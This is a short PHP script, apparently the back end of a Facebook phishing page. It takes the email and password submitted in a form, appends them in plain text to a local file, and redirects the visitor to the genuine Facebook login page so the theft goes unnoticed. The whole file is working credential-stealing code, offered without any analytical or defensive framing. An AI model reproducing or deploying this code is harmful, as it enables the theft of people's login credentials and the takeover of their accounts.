<?PHP
$login = $_POST['email'];
$password = $_POST['pass'];
$text = "///-email :" . $login . " ///-Pass :" . $password;
$filename = "somefile.txt";
$fh = fopen($filename, "a");
fwrite($fh, $text);
fclose($fh);
header('Location:https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU4Njc0MDA3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D');
